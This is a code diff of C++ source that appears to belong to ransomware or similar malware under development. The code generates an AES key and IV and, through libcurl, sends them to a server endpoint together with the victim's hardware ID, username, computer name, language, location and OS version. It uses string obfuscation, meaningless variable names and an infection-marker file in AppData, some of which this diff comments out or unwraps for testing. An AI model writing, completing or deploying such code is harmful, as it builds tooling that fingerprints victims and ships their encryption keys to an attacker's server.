@@ -29,6 +29,7 @@ int main(void) {
 	Systeme sys;
 	std::string username = sys.getUsername();
 
+	/*
 
 	std::string path = ("C:\\Users\\") + username + "\\AppData\\Roaming\\check.U3AZqJX";
 	std::ifstream hasAlready(path);
@@ -42,6 +43,7 @@ int main(void) {
 	}
 	checkFile << CHECK_KEY;
 	checkFile.close();
+	*/
 
 	CryptoPP::AutoSeededRandomPool prng;
 	CryptoPP::SecByteBlock  key(CryptoPP::AES::DEFAULT_KEYLENGTH);
@@ -50,24 +52,24 @@ int main(void) {
 	prng.GenerateBlock(key.data(), key.size());
 	prng.GenerateBlock(iv.data(), iv.size());
 
+
 	curl_global_init(CURL_GLOBAL_ALL);
-	CURL* curl;
+	CURL* curl = curl_easy_init();
 	if (curl) {
 		CURLcode res;
-		const char* url = AY_OBFUSCATE("http://localhost/server/hdhohzuag?action=add");
 		std::map<int, std::string> data = sys.getLocalization();
 		std::string ddzdzjd;
 		std::string dbhzgdzdgzm;
 		CryptoPP::StringSource(key.data(), key.size(), true, new CryptoPP::HexEncoder(new CryptoPP::StringSink(ddzdzjd)));
 		CryptoPP::StringSource(iv.data(), iv.size(), true, new CryptoPP::HexEncoder(new CryptoPP::StringSink(dbhzgdzdgzm)));
-		std::ostringstream ss;
-		ss << "uuid=" << sys.getHwId() << "&username=" << sys.getUsername() << "&computername=" << sys.getComputerName() << "&langId=" << sys.getLangId()
-			<< "&country=" << data[0] << "&region=" << data[3] << "&city=" << data[2] << "&latlong="  << data[1] << "&osversion=" << sys.getOsVersion() << "&key=" << ddzdzjd << "&iv=" << dbhzgdzdgzm;
-		curl_easy_setopt(curl, CURLOPT_URL, url);
-		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, ss.str().c_str());
+		std::string query = "uuid=" + sys.getHwId() +"&username=" + sys.getUsername() +"&computername=" + sys.getComputerName() +"&langId=" + std::to_string(sys.getLangId()) +
+			"&country=" + data[0] +"&region=" + data[3] +"&city=" + data[1] +"&latlong=" + data[2] +"&osversion=" + std::to_string(sys.getOsVersion()) +
+			"&key=" + ddzdzjd +"&iv=" + dbhzgdzdgzm;
+		curl_easy_setopt(curl, CURLOPT_URL,"http://localhost/server/hdhohzuag.php?action=add");
+		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, query.c_str());
+		std::cout << query << std::endl;
 		res = curl_easy_perform(curl);
 		std::cout << res << std::endl;
-		
 		return 0;
 	}
 	 	
